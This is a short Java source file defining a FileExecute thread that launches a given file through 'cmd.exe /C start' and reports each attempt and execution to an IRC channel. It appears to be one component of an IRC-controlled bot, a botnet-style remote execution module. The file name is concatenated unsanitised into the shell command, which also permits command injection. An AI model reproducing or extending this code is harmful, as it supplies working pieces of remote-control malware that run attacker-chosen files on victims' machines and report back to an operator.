import java.io.IOException;
/**
 * 
 * @author Nathan
 *
 */
public class FileExecute extends Thread
{
	/**
	 * Sets the file to execute
	 * @param fil
	 */
    public FileExecute(String fil)
    {
        rt = Runtime.getRuntime();
        file = fil;
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("Trying to execute file ")).append(file).toString());
    }
    /**
     * Executes the file on a new thread
     */
    public void run()
    {
        try
        {
            rt.exec((new StringBuilder("cmd.exe /C start ")).append(file).toString());
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
        IRC.sendMessage(Config.getChannel(), (new StringBuilder("File executed ")).append(file).toString());
    }

    public String file;
    Runtime rt;
}